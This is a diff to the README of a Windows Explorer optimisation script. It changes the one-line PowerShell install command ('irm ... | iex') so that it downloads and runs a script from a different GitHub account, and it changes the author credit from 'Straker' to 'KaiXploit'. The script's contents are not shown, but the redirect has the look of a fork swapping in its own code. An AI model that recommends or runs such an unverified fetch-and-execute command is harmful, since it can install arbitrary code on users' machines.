@@ -15,7 +15,7 @@ Windows Explorer can slow down over time due to accumulated folder view settings
 ### Running the Script with One Command
 - For a faster and easier experience, simply run the following command in PowerShell:
     ```powershell
-    irm "https://raw.githubusercontent.com/strakerbit/windows-explorer-optimizer/refs/heads/main/optimize_explorer_perfomance.ps1" | iex
+    irm "https://raw.githubusercontent.com/kaixplt/windows-explorer-optimizer/refs/heads/main/optimize_explorer_perfomance.ps1" | iex
     ```
 
 ### Running the Script Manually
@@ -42,4 +42,4 @@ Windows Explorer can slow down over time due to accumulated folder view settings
 This project is **open-source** and released under the **MIT License**.
 
 ## 👤 Author
-[Straker](https://github.com/strakerbit)
+[KaiXploit](https://github.com/kaixplt)
